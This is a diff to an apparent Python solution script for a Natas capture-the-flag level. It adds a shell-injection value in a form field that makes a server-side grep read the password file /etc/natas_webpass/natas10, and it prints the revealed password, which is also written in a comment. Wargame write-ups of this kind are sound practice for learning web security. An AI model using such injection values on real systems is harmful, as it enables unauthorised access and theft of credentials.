@@ -22,7 +22,7 @@ print(f'{div_content}\n')
 response = session.get(URL + 'index-source.html')
 source = html.unescape(response.text).replace('<br />', '')
 div = bs4.BeautifulSoup(source, 'lxml').body.find('div')
-print(div)
+print(f'{div}\n')
 
 
 """
@@ -37,3 +37,18 @@ if($key != "") {
 # one attack that we can try here is OS command injection or shell injection
 # this is because there is no user input sanitisation
 # the input is passed as is to the 'grep -i command'
+data = {
+    'needle' : '.* /etc/natas_webpass/natas10;',
+    'submit' : 'submit'
+}
+# essentially, we will use grep to search for everything, which is represented by the regex .*
+# in /etc/natas_webpass/natas10
+# and stop there by ending the command with a semi-colon
+response = session.post(URL, data=data)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
+
+
+# natas10 password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+password = re.search(r'/etc/natas_webpass/natas10:(\w+)', str(div_content)).group(1)
+print(f'natas10 password: {password}')
